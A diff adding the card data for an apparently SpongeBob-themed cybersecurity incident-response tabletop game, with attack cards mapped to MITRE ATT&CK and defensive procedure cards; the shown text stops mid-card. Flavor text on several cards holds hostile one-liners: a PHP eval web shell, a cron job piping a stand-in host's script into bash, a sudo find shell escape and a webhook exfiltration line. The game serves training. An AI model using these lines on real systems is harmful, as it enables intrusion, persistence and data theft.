@@ -1,0 +1,918 @@
+[
+  {
+    "id": "IC-001",
+    "title": "Spear Phishing with Actual Chum",
+    "deck": "initial_compromise",
+    "subtitle": "T1566.001 - Phishing: Spearphishing Attachment",
+    "attackId": "T1566.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "An email claiming a 90% discount on wholesale kelp flour contains 'invoice_october.xlsm'. Opening the spreadsheet executes an obfuscated VBA macro that reaches out to an external beacon.",
+    "flavorText": "'Free kelp? At that price, Mr. Krabs would open anything!'",
+    "iconName": "hook"
+  },
+  {
+    "id": "IC-002",
+    "title": "Unpatched Kelp-Facing Server",
+    "deck": "initial_compromise",
+    "subtitle": "T1190 - Exploit Public-Facing Application",
+    "attackId": "T1190",
+    "nistPhase": "Detection & Analysis",
+    "description": "An ancient Apache 1.3 HTTP server from 1999 running on a shipwreck router is discovered listening on port 80 with unpatched remote code execution vulnerabilities.",
+    "flavorText": "'If it ain't broken, I ain't paying for upgrades, boyo!' — Mr. Krabs",
+    "iconName": "server"
+  },
+  {
+    "id": "IC-003",
+    "title": "Salty Insider Shell Ducky",
+    "deck": "initial_compromise",
+    "subtitle": "T1091 - Replication Through Removable Media",
+    "attackId": "T1091",
+    "nistPhase": "Detection & Analysis",
+    "description": "A disgruntled, underpaid cashier leaves a USB Rubber Ducky disguised inside an oyster shell plugged into the front cash register POS terminal.",
+    "flavorText": "'I get paid minimum wage to stand here. Why should I check the USB ports?'",
+    "iconName": "clam"
+  },
+  {
+    "id": "IC-004",
+    "title": "Kitchen Drainage Pipe Intrusion",
+    "deck": "initial_compromise",
+    "subtitle": "T1200 - Physical Intrusion & Access",
+    "attackId": "T1200",
+    "nistPhase": "Detection & Analysis",
+    "description": "A microscopic operative physically crawls through the kitchen floor grease trap directly into the server closet patch panel, installing a hardware packet sniffer.",
+    "flavorText": "'One percent evil, ninety-nine percent hot gas and grease-trap crawling.'",
+    "iconName": "radar"
+  },
+  {
+    "id": "IC-005",
+    "title": "Supply Chain Kelp Poisoning",
+    "deck": "initial_compromise",
+    "subtitle": "T1195.002 - Supply Chain Compromise",
+    "attackId": "T1195.002",
+    "nistPhase": "Detection & Analysis",
+    "description": "A popular npm package 'kelp-calculator-v2' used by the online patty ordering portal is compromised with a credential harvesting payload.",
+    "flavorText": "'Who knew the open-source barnacle registry could be so treacherous?'",
+    "iconName": "bug"
+  },
+  {
+    "id": "IC-006",
+    "title": "Default Credentials on Deep Fryer IoT",
+    "deck": "initial_compromise",
+    "subtitle": "T1078.001 - Default Accounts",
+    "attackId": "T1078.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "The smart deep-fryer temperature regulation system is exposed on port 8080 with factory credentials 'admin:chum123'. An attacker logs in and obtains interactive shell access.",
+    "flavorText": "'Change the password? But the manual is laminated and bolted to the bulkhead!'",
+    "iconName": "key"
+  },
+  {
+    "id": "IC-007",
+    "title": "Malicious Subsea QR Code",
+    "deck": "initial_compromise",
+    "subtitle": "T1204.001 - User Execution: Malicious Link",
+    "attackId": "T1204.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "A fake QR code sticker pasted over the drive-thru menu board redirects patrons and order-taking managers to a credential-harvesting phishing portal.",
+    "flavorText": "'Scan for a free extra pickle! What could possibly go wrong?'",
+    "iconName": "file-text"
+  },
+  {
+    "id": "IC-008",
+    "title": "Drive-By Barnacle Download",
+    "deck": "initial_compromise",
+    "subtitle": "T1189 - Drive-by Compromise",
+    "attackId": "T1189",
+    "nistPhase": "Detection & Analysis",
+    "description": "Kitchen staff visits an unauthorized sea-shanty audio streaming website. A zero-day browser exploit drops a Cobalt-Chum beacon onto the terminal.",
+    "flavorText": "'I was just searching for 10-hour loops of sea shanties to survive my shift!'",
+    "iconName": "wifi"
+  },
+  {
+    "id": "IC-009",
+    "title": "Misconfigured Coral S3 Bucket",
+    "deck": "initial_compromise",
+    "subtitle": "T1530 - Data from Cloud Storage",
+    "attackId": "T1530",
+    "nistPhase": "Detection & Analysis",
+    "description": "A cloud storage bucket containing legacy franchise contracts and secret recipe ratios was mistakenly marked public with 'AllUsers:Read' permissions.",
+    "flavorText": "'The cloud is just someone else's shipwreck, boyo.'",
+    "iconName": "database"
+  },
+  {
+    "id": "IC-010",
+    "title": "Stolen Kitchen Display API Key",
+    "deck": "initial_compromise",
+    "subtitle": "T1552.001 - Credentials in Files",
+    "attackId": "T1552.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "Hardcoded production API keys and database connection strings were pushed to a public GitHub repository by an unpaid intern during hackathon night.",
+    "flavorText": "'git commit -m \"oops pushed prod secrets to public repo\"'",
+    "iconName": "key"
+  },
+  {
+    "id": "IC-011",
+    "title": "Voice Phishing (Vishing) the Cashier",
+    "deck": "initial_compromise",
+    "subtitle": "T1566.003 - Phishing: Spearphishing Voice",
+    "attackId": "T1566.003",
+    "nistPhase": "Detection & Analysis",
+    "description": "Plankton uses an AI voice modulator to pose as Mr. Krabs, calling the front register and demanding the two-factor authentication SMS code immediately.",
+    "flavorText": "'Argh argh argh! Read me that 6-digit number on your shell phone right now, boy!'",
+    "iconName": "alert-triangle"
+  },
+  {
+    "id": "IC-012",
+    "title": "Compromised Undersea HVAC Controller",
+    "deck": "initial_compromise",
+    "subtitle": "T1078.003 - Local Accounts",
+    "attackId": "T1078.003",
+    "nistPhase": "Detection & Analysis",
+    "description": "A third-party refrigeration contractor's remote diagnostic portal is compromised, giving the attacker access to the internal building management network.",
+    "flavorText": "'Target had HVAC, we have Kelp Cooler 3000. History repeats itself underwater.'",
+    "iconName": "server"
+  },
+  {
+    "id": "PE-001",
+    "title": "Pass-the-Kelp-Hash",
+    "deck": "pivot_escalate",
+    "subtitle": "T1550.002 - Use Alternate Authentication: Pass the Hash",
+    "attackId": "T1550.002",
+    "nistPhase": "Detection & Analysis",
+    "description": "Legacy NTLM authentication remains enabled across the galley. The adversary extracts NTLM hashes from memory and authenticates to all kitchen terminals.",
+    "flavorText": "'Pass the ketchup? No, pass the NTLM hash across the entire subnet!'",
+    "iconName": "key"
+  },
+  {
+    "id": "PE-002",
+    "title": "Living Off the Coral (LOLBins)",
+    "deck": "pivot_escalate",
+    "subtitle": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+    "attackId": "T1059.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "The adversary uses built-in administrative tools like SeaShell (PowerShell), certutil, and wmic to download tools and enumerate network shares without triggering AV.",
+    "flavorText": "'Why bring our own malware when Mr. Krabs provides all the tools we need?'",
+    "iconName": "terminal"
+  },
+  {
+    "id": "PE-003",
+    "title": "Sponge-in-the-Middle (SITM)",
+    "deck": "pivot_escalate",
+    "subtitle": "T1557 - Adversary-in-the-Middle",
+    "attackId": "T1557",
+    "nistPhase": "Detection & Analysis",
+    "description": "ARP cache poisoning on the internal dining room switchboard intercepts cleartext kitchen tickets and session tokens transmitted between registers.",
+    "flavorText": "'He lives in a pineapple and intercepts your unencrypted ARP broadcasts!'",
+    "iconName": "wifi"
+  },
+  {
+    "id": "PE-004",
+    "title": "Anemone Unquoted Service Path",
+    "deck": "pivot_escalate",
+    "subtitle": "T1068 - Exploitation for Privilege Escalation",
+    "attackId": "T1068",
+    "nistPhase": "Detection & Analysis",
+    "description": "The deep-fryer temperature daemon runs with SYSTEM privileges from 'C:\\Program Files\\Krusty Tech\\Fryer.exe'. Dropping 'C:\\Program.exe' yields instant root access.",
+    "flavorText": "'Quotes were too expensive, boyo. Each quote mark costs two cents!'",
+    "iconName": "zap"
+  },
+  {
+    "id": "PE-005",
+    "title": "Active Directory Trench Forest Compromise",
+    "deck": "pivot_escalate",
+    "subtitle": "T1484 - Domain Policy Modification",
+    "attackId": "T1484",
+    "nistPhase": "Detection & Analysis",
+    "description": "A DCSync attack executed against domain controller 'dc01.bikini.local' extracts password hashes for every account in the forest, including Domain Admins.",
+    "flavorText": "'Replication requested by the Chum Bucket DC. Request approved!'",
+    "iconName": "server"
+  },
+  {
+    "id": "PE-006",
+    "title": "Kerberoasting Mr. Krabs' Account",
+    "deck": "pivot_escalate",
+    "subtitle": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
+    "attackId": "T1558.003",
+    "nistPhase": "Detection & Analysis",
+    "description": "Adversary requests Service Principal Name (SPN) tickets for 'krabs/formula-vault' and cracks the weak RC4-encrypted service ticket offline in seconds.",
+    "flavorText": "'Password: Patty123! — Krabs thought special characters made it uncrackable.'",
+    "iconName": "key"
+  },
+  {
+    "id": "PE-007",
+    "title": "Insecure SSH Keys in Kelp Cache",
+    "deck": "pivot_escalate",
+    "subtitle": "T1552.004 - Private Keys",
+    "attackId": "T1552.004",
+    "nistPhase": "Detection & Analysis",
+    "description": "An unencrypted root private key 'id_rsa' is found resting in a public backup share. It provides passwordless SSH root access to the recipe encryption server.",
+    "flavorText": "'Passphrase? Who has time to type passphrases during the lunch rush?'",
+    "iconName": "lock"
+  },
+  {
+    "id": "PE-008",
+    "title": "Rogue Undersea Wi-Fi Pineapple",
+    "deck": "pivot_escalate",
+    "subtitle": "T1557.001 - LLMNR/NBT-NS Poisoning and Relay",
+    "attackId": "T1557.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "A rogue access point broadcasting 'KrustyKrab_Guest_WiFi' responds to NetBIOS/LLMNR name queries, capturing and relaying employee NetNTLMv2 hashes.",
+    "flavorText": "'Free guest Wi-Fi with instant credential harvesting capabilities!'",
+    "iconName": "wifi"
+  },
+  {
+    "id": "PE-009",
+    "title": "Sudo Privilege Misconfiguration",
+    "deck": "pivot_escalate",
+    "subtitle": "T1548.003 - Sudo and Sudo Caching",
+    "attackId": "T1548.003",
+    "nistPhase": "Detection & Analysis",
+    "description": "The fry cook Linux account in `/etc/sudoers` has permission to run `/usr/bin/find` as root without entering a password, allowing instantaneous shell breakout.",
+    "flavorText": "'sudo find . -exec /bin/sh -p \\; -quit # Order up!'",
+    "iconName": "terminal"
+  },
+  {
+    "id": "PE-010",
+    "title": "Remote Desktop (RDP) Lateral Leap",
+    "deck": "pivot_escalate",
+    "subtitle": "T1021.001 - Remote Services: Remote Desktop Protocol",
+    "attackId": "T1021.001",
+    "nistPhase": "Detection & Analysis",
+    "description": "Sticky-keys backdoor activated across RDP sessions lets the attacker hop from cashier workstations into the financial vault server without credentials.",
+    "flavorText": "'Press Shift five times to conquer the undersea corporate network.'",
+    "iconName": "radar"
+  },
+  {
+    "id": "PE-011",
+    "title": "Local Administrator Password Reuse",
+    "deck": "pivot_escalate",
+    "subtitle": "T1078.003 - Local Accounts",
+    "attackId": "T1078.003",
+    "nistPhase": "Detection & Analysis",
+    "description": "Every single terminal, POS display, and backup NAS shares the identical local Administrator password: 'MoneyMoneyMoney!1'.",
+    "flavorText": "'Deploying LAPS would mean buying a domain controller license!'",
+    "iconName": "key"
+  },
+  {
+    "id": "PE-012",
+    "title": "PrintNightmare on Receipt Spooler",
+    "deck": "pivot_escalate",
+    "subtitle": "T1068 - Exploitation for Privilege Escalation",
+    "attackId": "T1068",
+    "nistPhase": "Detection & Analysis",
+    "description": "Vulnerability in the Windows Print Spooler service on the receipt server allows any authenticated user to install malicious print drivers as SYSTEM.",
+    "flavorText": "'Your receipt has been printed... along with an interactive SYSTEM reverse shell.'",
+    "iconName": "server"
+  },
+  {
+    "id": "P-001",
+    "title": "Barnacle Registry Run Keys",
+    "deck": "persistence",
+    "subtitle": "T1547.001 - Boot or Logon Autostart: Registry Run Keys",
+    "attackId": "T1547.001",
+    "nistPhase": "Containment & Eradication",
+    "description": "Malicious entries in `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` execute the Chum payload silently every time a cashier logs in.",
+    "flavorText": "'Like stubborn barnacles glued to the hull, it boots with every morning shift.'",
+    "iconName": "anchor"
+  },
+  {
+    "id": "P-002",
+    "title": "Deep Trench PHP Web Shell",
+    "deck": "persistence",
+    "subtitle": "T1505.003 - Server Software Component: Web Shell",
+    "attackId": "T1505.003",
+    "nistPhase": "Containment & Eradication",
+    "description": "A single-line PHP eval backdoor hidden inside `/var/www/krusty/menu_upload.php` allows persistent unauthenticated remote command execution.",
+    "flavorText": "'<?php @eval($_POST[\"chum\"]); ?> — disguised as daily clam chowder specials.'",
+    "iconName": "terminal"
+  },
+  {
+    "id": "P-003",
+    "title": "Midnight Cron Job of the Abyss",
+    "deck": "persistence",
+    "subtitle": "T1053.003 - Scheduled Task/Job: Cron",
+    "attackId": "T1053.003",
+    "nistPhase": "Containment & Eradication",
+    "description": "Scheduled job `/etc/cron.d/chum_sync` runs every midnight as root to re-download beacon payloads if the active connection was severed by defenders.",
+    "flavorText": "'0 0 * * * curl -s http://chumbucket.onion/rev.sh | bash'",
+    "iconName": "database"
+  },
+  {
+    "id": "P-004",
+    "title": "Backdoored Submersible Firmware",
+    "deck": "persistence",
+    "subtitle": "T1542.001 - System Firmware: UEFI",
+    "attackId": "T1542.001",
+    "nistPhase": "Containment & Eradication",
+    "description": "Adversary flashes a malicious UEFI SPI image onto the recipe vault server's motherboard, surviving complete hard drive wipes and operating system reinstalls.",
+    "flavorText": "'You reinstalled Windows? How adorable. I live in the silicon now.'",
+    "iconName": "zap"
+  },
+  {
+    "id": "P-005",
+    "title": "Golden Clam Kerberos Ticket",
+    "deck": "persistence",
+    "subtitle": "T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket",
+    "attackId": "T1558.001",
+    "nistPhase": "Containment & Eradication",
+    "description": "Having dumped the KRBTGT password hash, the attacker forges valid Ticket Granting Tickets (TGTs) giving them unlimited 10-year access as Enterprise Admin.",
+    "flavorText": "'The ultimate undersea key. Even changing passwords twice won't save you.'",
+    "iconName": "clam"
+  },
+  {
+    "id": "P-006",
+    "title": "Corrupted WMI Event Subscription",
+    "deck": "persistence",
+    "subtitle": "T1546.004 - Event Triggered Execution: WMI Event Subscription",
+    "attackId": "T1546.004",
+    "nistPhase": "Containment & Eradication",
+    "description": "WMI `__EventFilter` and `CommandLineEventConsumer` configured to launch an encoded PowerShell payload whenever CPU utilization drops below 5%.",
+    "flavorText": "'Stealthy event-driven execution with zero executables resting on disk.'",
+    "iconName": "radar"
+  },
+  {
+    "id": "P-007",
+    "title": "Hidden Undersea Systemd Service",
+    "deck": "persistence",
+    "subtitle": "T1543.002 - Create or Modify System Process: Systemd Service",
+    "attackId": "T1543.002",
+    "nistPhase": "Containment & Eradication",
+    "description": "Malicious systemd unit `chum-telemetry.service` configured with `Restart=always` masked as a genuine kitchen exhaust ventilation monitor.",
+    "flavorText": "'systemctl status chum-telemetry # Active: running (since breakfast)'",
+    "iconName": "server"
+  },
+  {
+    "id": "P-008",
+    "title": "Account Created: 'squidward_backup'",
+    "deck": "persistence",
+    "subtitle": "T1136.001 - Create Account: Local Account",
+    "attackId": "T1136.001",
+    "nistPhase": "Containment & Eradication",
+    "description": "A shadow administrative account added to local Administrators group with 'Password Never Expires' flag and remote access privileges.",
+    "flavorText": "'I never created that account, and I would never volunteer to do backups!'",
+    "iconName": "key"
+  },
+  {
+    "id": "P-009",
+    "title": "DLL Sideloading in Cash Register Software",
+    "deck": "persistence",
+    "subtitle": "T1574.002 - Hijack Execution Flow: DLL Side-Loading",
+    "attackId": "T1574.002",
+    "nistPhase": "Containment & Eradication",
+    "description": "A weaponized `version.dll` placed alongside the legitimate point-of-sale executable is loaded into memory automatically during store opening.",
+    "flavorText": "'Valid signed binary loads malicious unsigned DLL without raising any alarms.'",
+    "iconName": "bug"
+  },
+  {
+    "id": "P-010",
+    "title": "Browser Extension Chum Hijacker",
+    "deck": "persistence",
+    "subtitle": "T1176 - Browser Extensions",
+    "attackId": "T1176",
+    "nistPhase": "Containment & Eradication",
+    "description": "An unofficial Chrome extension 'Bikini Bottom Coupon Clipper' installed on manager laptops silently reads all form inputs and cookies.",
+    "flavorText": "'It saved 5 cents on napkins but sends all session cookies to Plankton!'",
+    "iconName": "wifi"
+  },
+  {
+    "id": "P-011",
+    "title": "Compromised Formula Backup Appliance",
+    "deck": "persistence",
+    "subtitle": "T1098 - Account Manipulation",
+    "attackId": "T1098",
+    "nistPhase": "Containment & Eradication",
+    "description": "The dedicated NAS backup appliance firmware is compromised with an SSH key backdoor, ensuring backdoor access even after the primary network is scrubbed.",
+    "flavorText": "'Backups are healthy, pristine, and silently exfiltrated to the Chum Bucket.'",
+    "iconName": "database"
+  },
+  {
+    "id": "P-012",
+    "title": "Submarine PAM Backdoor",
+    "deck": "persistence",
+    "subtitle": "T1556.004 - Modify Authentication Process: PAM",
+    "attackId": "T1556.004",
+    "nistPhase": "Containment & Eradication",
+    "description": "Pluggable Authentication Module `pam_unix.so` patched with a hardcoded master backdoor password, granting instant root login regardless of user password changes.",
+    "flavorText": "'Skeleton key unlocked: enter \"plankton_was_here\" to access any account.'",
+    "iconName": "lock"
+  },
+  {
+    "id": "C2-001",
+    "title": "Barnacle DNS Tunneling",
+    "deck": "c2_exfil",
+    "subtitle": "T1071.004 - Application Layer Protocol: DNS",
+    "attackId": "T1071.004",
+    "nistPhase": "Containment & Eradication",
+    "description": "Krabby Patty formula salt ratios are chunked and exfiltrated over base64-encoded subdomains in low-volume recursive DNS TXT queries, bypassing firewall rules.",
+    "flavorText": "'Querying 6b7261626279.c2.chumbucket.biz... TXT reply received!'",
+    "iconName": "clam"
+  },
+  {
+    "id": "C2-002",
+    "title": "Encrypted Cloud Trench S3 Bucket",
+    "deck": "c2_exfil",
+    "subtitle": "T1567.002 - Exfiltration to Cloud Storage",
+    "attackId": "T1567.002",
+    "nistPhase": "Containment & Eradication",
+    "description": "Encrypted archive `patty_secret_recipe.7z.enc` uploaded directly to an untracked external AWS S3 bucket using native AWS CLI over TLS port 443.",
+    "flavorText": "'Standard outbound HTTPS traffic. Firewalls assume someone is buying spatulas.'",
+    "iconName": "database"
+  },
+  {
+    "id": "C2-003",
+    "title": "Red Snapper Ransomware Detonation",
+    "deck": "c2_exfil",
+    "subtitle": "T1486 - Data Encrypted for Impact",
+    "attackId": "T1486",
+    "nistPhase": "Containment & Eradication",
+    "description": "Point-of-sale registers and order databases are locked by high-speed ChaCha20 encryption 10 minutes before Friday lunch rush; demands 50,000 Barnacle Bitcoins.",
+    "flavorText": "'YOUR RECIPES ARE ENCRYPTED. PAY 50,000 BITCOINS OR THE SECRET IS PUBLIC!'",
+    "iconName": "alert-triangle"
+  },
+  {
+    "id": "C2-004",
+    "title": "Dead Man's Chest Steganography",
+    "deck": "c2_exfil",
+    "subtitle": "T1027.003 - Obfuscated Files or Information: Steganography",
+    "attackId": "T1027.003",
+    "nistPhase": "Containment & Eradication",
+    "description": "Proprietary spice measurements encoded into the least significant bits of innocent jellyfish photos uploaded to the Krusty Krab official social media page.",
+    "flavorText": "'Just a picture of a cute jellyfish... containing 40MB of proprietary culinary secrets.'",
+    "iconName": "file-text"
+  },
+  {
+    "id": "C2-005",
+    "title": "Slow-and-Low Sonar ICMP Exfil",
+    "deck": "c2_exfil",
+    "subtitle": "T1048.003 - Exfiltration Over Alternative Protocol: ICMP",
+    "attackId": "T1048.003",
+    "nistPhase": "Containment & Eradication",
+    "description": "Formula bytes packed into ping payload fields mimicking acoustic marine sonar telemetry. The data leaves the network at a trickle to avoid triggering IDS rate limits.",
+    "flavorText": "'Ping... ping... ping... byte by byte, the formula vanishes into the deep.'",
+    "iconName": "radar"
+  },
+  {
+    "id": "C2-006",
+    "title": "Telegram Bot Chum C2 Channel",
+    "deck": "c2_exfil",
+    "subtitle": "T1102.002 - Web Service: Bidirectional Communication",
+    "attackId": "T1102.002",
+    "nistPhase": "Containment & Eradication",
+    "description": "Malware polls Telegram Bot API via standard HTTPS to receive facilitator commands and send status telemetry, blending with legitimate social traffic.",
+    "flavorText": "'Plankton controls the kitchen botnet from his smartphone while ordering takeout.'",
+    "iconName": "wifi"
+  },
+  {
+    "id": "C2-007",
+    "title": "Exfiltration Over Subsea Webhook",
+    "deck": "c2_exfil",
+    "subtitle": "T1567 - Exfiltration Over Web Service",
+    "attackId": "T1567",
+    "nistPhase": "Containment & Eradication",
+    "description": "Real-time kitchen order feeds and cashier credentials piped directly to an external Discord webhook, broadcasting every transaction to the Chum Bucket.",
+    "flavorText": "'POST https://discord.com/api/webhooks/... Payload: SecretFormula.csv'",
+    "iconName": "zap"
+  },
+  {
+    "id": "C2-008",
+    "title": "Data Destruction: Wipe the POS Drives",
+    "deck": "c2_exfil",
+    "subtitle": "T1485 - Data Destruction",
+    "attackId": "T1485",
+    "nistPhase": "Containment & Eradication",
+    "description": "When detection is suspected, the adversary triggers a raw disk wiper over Master Boot Records across all cash registers, leaving systems unbootable.",
+    "flavorText": "'If I can't have the formula, nobody will ever sell a Krabby Patty again!'",
+    "iconName": "skull"
+  },
+  {
+    "id": "C2-009",
+    "title": "HTTPS Beaconing to chumbucket.biz",
+    "deck": "c2_exfil",
+    "subtitle": "T1071.001 - Application Layer Protocol: Web Protocols",
+    "attackId": "T1071.001",
+    "nistPhase": "Containment & Eradication",
+    "description": "A persistent beacon checks in every 60 seconds with 20% jitter over TLS, mimicking regular undersea tide and weather sensor polling requests.",
+    "flavorText": "'Jittered beaconing makes periodic callbacks look like natural ocean swells.'",
+    "iconName": "anchor"
+  },
+  {
+    "id": "C2-010",
+    "title": "Email Auto-Forwarding Rule",
+    "deck": "c2_exfil",
+    "subtitle": "T1114.003 - Email Collection: Email Forwarding Rule",
+    "attackId": "T1114.003",
+    "nistPhase": "Containment & Eradication",
+    "description": "Hidden Outlook rule forwards every email containing 'formula', 'secret', or 'payroll' to external mailbox `plankton@chum.reef` and moves originals to RSS folder.",
+    "flavorText": "'Mr. Krabs wondered why his inbox was so quiet lately.'",
+    "iconName": "file-text"
+  },
+  {
+    "id": "C2-011",
+    "title": "Exfiltration to Deep Sea USB Vault",
+    "deck": "c2_exfil",
+    "subtitle": "T1052.001 - Exfiltration Over Physical Medium",
+    "attackId": "T1052.001",
+    "nistPhase": "Containment & Eradication",
+    "description": "Formula dumped onto an air-gapped ruggedized flash drive dropped out of an underwater sewer pipe and retrieved by a remote-controlled mini-sub.",
+    "flavorText": "'Sneakernet: The fastest undersea bandwidth is a mini-sub loaded with thumb drives.'",
+    "iconName": "clam"
+  },
+  {
+    "id": "C2-012",
+    "title": "VoIP Trunk Audio Eavesdropping",
+    "deck": "c2_exfil",
+    "subtitle": "T1040 - Network Sniffing: VoIP Tapping",
+    "attackId": "T1040",
+    "nistPhase": "Containment & Eradication",
+    "description": "The SIP voice trunk is tapped to intercept Mr. Krabs verbally dictating the safe combination to his Swiss banker during an unencrypted phone call.",
+    "flavorText": "'Four... Seven... Two... Argh, who's breathing heavily on the line?!'",
+    "iconName": "server"
+  },
+  {
+    "id": "PROC-001",
+    "title": "Endpoint Memory Forensics",
+    "deck": "procedures",
+    "subtitle": "Volatile Memory Triage (Volatility / DumpIt)",
+    "nistPhase": "Detection & Analysis",
+    "description": "Capture volatile RAM from suspect cash register and analyze process trees, injected DLLs, and hollowed memory segments.",
+    "flavorText": "'Memory doesn't lie, even when the cashier does.'",
+    "iconName": "terminal",
+    "checks": [
+      { "target": 11, "description": "Detect injected process or hidden shellcode" },
+      { "target": 15, "description": "Extract decrypted C2 IP and uncover root cause payload" }
+    ]
+  },
+  {
+    "id": "PROC-002",
+    "title": "Network Traffic & Zeek Inspection",
+    "deck": "procedures",
+    "subtitle": "Deep Packet Inspection (Zeek / Wireshark)",
+    "nistPhase": "Detection & Analysis",
+    "description": "Deploy network taps on core undersea switchboards to inspect flow records, DNS anomalies, and TLS certificate metadata.",
+    "flavorText": "'Sniffing packets in the dark depths of the server room.'",
+    "iconName": "radar",
+    "checks": [
+      { "target": 11, "description": "Identify anomalous beaconing or DNS tunneling" },
+      { "target": 14, "description": "Carve exfiltrated payload or identify command channel" }
+    ]
+  },
+  {
+    "id": "PROC-003",
+    "title": "Barnacle SIEM Log Analysis",
+    "deck": "procedures",
+    "subtitle": "Log Aggregation & Correlation (Elastic / Splunk)",
+    "nistPhase": "Detection & Analysis",
+    "description": "Query centralized Windows Event Logs, Sysmon telemetry, and POS transaction journals to reconstruct attacker movement.",
+    "flavorText": "'Sorting through two billion lines of logs to find five seconds of treachery.'",
+    "iconName": "database",
+    "checks": [
+      { "target": 11, "description": "Trace originating workstation IP and logon ID" },
+      { "target": 15, "description": "Build complete chronological attack timeline" }
+    ]
+  },
+  {
+    "id": "PROC-004",
+    "title": "Host Quarantine & Isolation",
+    "deck": "procedures",
+    "subtitle": "Network Segmentation & Containment",
+    "nistPhase": "Containment & Eradication",
+    "description": "Sever active network links and apply microsegmentation firewalls to trap the adversary within an isolated VLAN segment.",
+    "flavorText": "'Pull the Ethernet cable before the fire spreads to the fryers!'",
+    "iconName": "shield",
+    "checks": [
+      { "target": 12, "description": "Successfully isolate host without disrupting kitchen orders" }
+    ]
+  },
+  {
+    "id": "PROC-005",
+    "title": "Kerberos Purge & Credential Reset",
+    "deck": "procedures",
+    "subtitle": "Identity Hygiene & Golden Ticket Eradication",
+    "nistPhase": "Containment & Eradication",
+    "description": "Reset the KRBTGT password twice, purge cached Kerberos tickets, and enforce enterprise-wide MFA session invalidation.",
+    "flavorText": "'Resetting passwords: the only thing more painful than an audit.'",
+    "iconName": "key",
+    "checks": [
+      { "target": 13, "description": "Invalidate Golden Tickets and sever all active sessions" }
+    ]
+  },
+  {
+    "id": "PROC-006",
+    "title": "Threat Intelligence Attribution",
+    "deck": "procedures",
+    "subtitle": "OSINT & Threat Actor Profiling",
+    "nistPhase": "Detection & Analysis",
+    "description": "Correlate observed TTPs against known Ocean-OSINT dossiers and APT-Chum historical attack campaigns.",
+    "flavorText": "'Matches Plankton's standard playbook from the Great Chum Heist of '04.'",
+    "iconName": "file-text",
+    "checks": [
+      { "target": 10, "description": "Attribute threat actor and receive list of known IOCs" }
+    ]
+  },
+  {
+    "id": "PROC-007",
+    "title": "Backup Integrity Verification",
+    "deck": "procedures",
+    "subtitle": "Disaster Recovery & Offline Snapshot Audit",
+    "nistPhase": "Containment & Eradication",
+    "description": "Audit immutable tape backups to confirm clean formula archives exist prior to the initial compromise date.",
+    "flavorText": "'Rule #1: A backup that hasn't been tested is merely a wish.'",
+    "iconName": "database",
+    "checks": [
+      { "target": 11, "description": "Verify unencrypted cold backup exists" },
+      { "target": 15, "description": "Restore POS database in under 15 minutes" }
+    ]
+  },
+  {
+    "id": "PROC-008",
+    "title": "Antivirus & EDR Deep Scrub",
+    "deck": "procedures",
+    "subtitle": "Endpoint Detection and Response Cleanse",
+    "nistPhase": "Containment & Eradication",
+    "description": "Push emergency EDR signature rules and heuristic behavioral scanners across all endpoints to kill malicious processes.",
+    "flavorText": "'Unleash the automated cleaners on every silicon surface.'",
+    "iconName": "shield",
+    "checks": [
+      { "target": 12, "description": "Quarantine active malware and scrub registry persistence" }
+    ]
+  },
+  {
+    "id": "PROC-009",
+    "title": "DNS Sinkholing & Egress Null-Route",
+    "deck": "procedures",
+    "subtitle": "Perimeter Boundary Defense",
+    "nistPhase": "Containment & Eradication",
+    "description": "Point malicious C2 domains to an internal sinkhole server, cutting off beaconing and logging all infected internal nodes.",
+    "flavorText": "'All your beacons are belong to us now.'",
+    "iconName": "clam",
+    "checks": [
+      { "target": 11, "description": "Block C2 domain and identify internal beaconing hosts" }
+    ]
+  },
+  {
+    "id": "PROC-010",
+    "title": "Firewall Rule Fortification",
+    "deck": "procedures",
+    "subtitle": "Inter-VLAN Access Control Lists",
+    "nistPhase": "Containment & Eradication",
+    "description": "Harden edge and internal firewall rules, blocking SMB, RDP, and unused ports between guest, kitchen, and vault zones.",
+    "flavorText": "'Close the hatches and batten down the subnets!'",
+    "iconName": "lock",
+    "checks": [
+      { "target": 12, "description": "Block attacker lateral movement and lock down the perimeter" }
+    ]
+  },
+  {
+    "id": "PROC-011",
+    "title": "Patch Management & Remediation",
+    "deck": "procedures",
+    "subtitle": "Vulnerability Eradication & Hardening",
+    "nistPhase": "Containment & Eradication",
+    "description": "Deploy emergency out-of-band security patches, update Apache web servers, and close unquoted service path holes.",
+    "flavorText": "'Better late than never to patch a vulnerability from 1999.'",
+    "iconName": "zap",
+    "checks": [
+      { "target": 13, "description": "Patch exploited software and remediate privilege flaw" }
+    ]
+  },
+  {
+    "id": "PROC-012",
+    "title": "Digital Forensics Disk Imaging",
+    "deck": "procedures",
+    "subtitle": "Chain of Custody & Evidence Preservation",
+    "nistPhase": "Detection & Analysis",
+    "description": "Perform raw bit-stream drive acquisition with cryptographic hashing to preserve legal evidence of tampering.",
+    "flavorText": "'Court-admissible proof that someone messed with the formula.'",
+    "iconName": "server",
+    "checks": [
+      { "target": 12, "description": "Recover deleted web shell and verify forensic integrity" }
+    ]
+  },
+  {
+    "id": "PROC-013",
+    "title": "Account Audit & Revocation",
+    "deck": "procedures",
+    "subtitle": "Access Control & Identity Audit",
+    "nistPhase": "Containment & Eradication",
+    "description": "Scan Active Directory and local security databases to identify and terminate unauthorized shadow accounts.",
+    "flavorText": "'You don't even work here! Account disabled.'",
+    "iconName": "key",
+    "checks": [
+      { "target": 11, "description": "Locate and revoke all rogue administrator accounts" }
+    ]
+  },
+  {
+    "id": "PROC-014",
+    "title": "Web Application Hardening",
+    "deck": "procedures",
+    "subtitle": "Code Review & Input Sanitization",
+    "nistPhase": "Containment & Eradication",
+    "description": "Audit web portal PHP scripts, remove backdoor eval statements, and implement strict MIME-type file upload filtering.",
+    "flavorText": "'Sanitize your inputs or suffer the wrath of the sea!'",
+    "iconName": "terminal",
+    "checks": [
+      { "target": 13, "description": "Eradicate web shell and patch upload validation" }
+    ]
+  },
+  {
+    "id": "PROC-015",
+    "title": "Incident Command Facilitation",
+    "deck": "procedures",
+    "subtitle": "Operational Leadership & Coordination",
+    "nistPhase": "Post-Incident Activity",
